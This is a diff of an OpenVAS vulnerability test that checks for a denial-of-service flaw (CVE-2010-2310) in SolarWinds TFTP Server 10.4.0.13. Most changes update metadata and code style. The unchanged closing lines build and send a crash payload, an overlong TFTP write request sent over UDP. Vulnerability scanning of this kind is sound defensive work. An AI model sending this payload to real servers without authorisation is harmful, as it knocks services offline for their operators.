@@ -1,6 +1,6 @@
 ###############################################################################
 # OpenVAS Vulnerability Test
-# $Id: secpod_solarwinds_tftp_server_dos_vuln.nasl 5161 2017-02-02 07:00:49Z cfi $
+# $Id: secpod_solarwinds_tftp_server_dos_vuln.nasl 13202 2019-01-21 15:19:15Z cfischer $
 #
 # SolarWinds TFTP Server Write Request Denial Of Service Vulnerability
 #
@@ -27,10 +27,10 @@
 if(description)
 {
   script_oid("1.3.6.1.4.1.25623.1.0.901124");
-  script_version("$Revision: 5161 $");
+  script_version("$Revision: 13202 $");
   script_cve_id("CVE-2010-2310");
   script_bugtraq_id(40824);
-  script_tag(name:"last_modification", value:"$Date: 2017-02-02 08:00:49 +0100 (Thu, 02 Feb 2017) $");
+  script_tag(name:"last_modification", value:"$Date: 2019-01-21 16:19:15 +0100 (Mon, 21 Jan 2019) $");
   script_tag(name:"creation_date", value:"2010-06-22 13:34:32 +0200 (Tue, 22 Jun 2010)");
   script_tag(name:"cvss_base", value:"5.0");
   script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:P");
@@ -38,25 +38,24 @@ if(description)
   script_category(ACT_DENIAL);
   script_copyright("Copyright (C) 2010 SecPod");
   script_family("Denial of Service");
-  script_dependencies("tftpd_detect.nasl");
+  script_dependencies("tftpd_detect.nasl", "global_settings.nasl", "os_detection.nasl");
   script_require_udp_ports("Services/udp/tftp", 69);
+  script_require_keys("tftp/detected", "Host/runs_windows");
+  script_exclude_keys("keys/TARGET_IS_IPV6");
 
   script_xref(name:"URL", value:"http://www.exploit-db.com/exploits/13836");
 
   script_tag(name:"impact", value:"Successful exploitation will allow attacker to crash the server
-  process, resulting in a denial-of-service condition.
+  process, resulting in a denial-of-service condition.");
 
-  Impact Level: Application");
-
-  script_tag(name:"affected", value:"SolarWinds TFTP Server 10.4.0.13");
+  script_tag(name:"affected", value:"SolarWinds TFTP Server 10.4.0.13.");
 
   script_tag(name:"insight", value:"The flaw is caused by an error when processing TFTP write
   requests, which can be exploited to crash the server via a specially crafted request.");
 
-  script_tag(name:"solution", value:"No solution or patch was made available for at least one year
-  since disclosure of this vulnerability. Likely none will be provided anymore.
-  General solution options are to upgrade to a newer release, disable respective
-  features, remove the product or replace the product by another one.");
+  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure of this vulnerability.
+  Likely none will be provided anymore. General solution options are to upgrade to a newer release, disable respective features, remove the
+  product or replace the product by another one.");
 
   script_tag(name:"summary", value:"This host is running SolarWinds TFTP Server and is prone to
   denial of service vulnerability.");
@@ -70,14 +69,19 @@ if(description)
 include("tftp.inc");
 
 port = get_kb_item( "Services/udp/tftp" );
-if( ! port ) port = 69;
-if( ! get_udp_port_state( port ) ) exit( 0 );
+if( ! port )
+  port = 69;
 
-if( ! tftp_alive( port:port ) ) exit( 0 );
+if( ! get_udp_port_state( port ) )
+  exit( 0 );
+
+if( ! tftp_alive( port:port ) )
+  exit( 0 );
+
 sock = open_sock_udp( port );
-if( ! sock ) exit( 0 );
+if( ! sock )
+  exit( 0 );
 
-## Building Crash
 crash = raw_string( 0x00, 0x02 ) + crap( 1000 ) + raw_string( 0x00 ) +
         "NETASCII" + raw_string( 0x00 );
 send( socket:sock, data:crash );
